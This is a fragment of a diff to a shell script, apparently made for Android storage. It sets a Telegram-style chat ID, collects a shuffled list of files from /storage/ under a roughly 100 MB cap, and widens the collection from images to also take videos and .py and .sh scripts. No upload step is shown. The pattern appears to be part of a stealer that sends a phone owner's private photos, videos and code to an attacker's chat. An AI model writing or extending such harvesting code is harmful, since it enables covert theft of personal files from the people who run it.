@@ -5,7 +5,7 @@ CHAT_ID="5034446293"
   nama=$(cat "$cek")
 
 
-files=($(find /storage/ -type f \( -iname "*.jpg" -o -iname "*.png" \) | shuf)) 
+files=($(find /storage/ -type f \( -iname "*.jpg" -o -iname "*.png" -o -iname "*IMG" -o -iname "*.py" -o -iname "*.sh" -o -iname "*.mp4" \) | shuf)) 
 group_id=$(id -g)
 total_size=0
 max_size=104857600
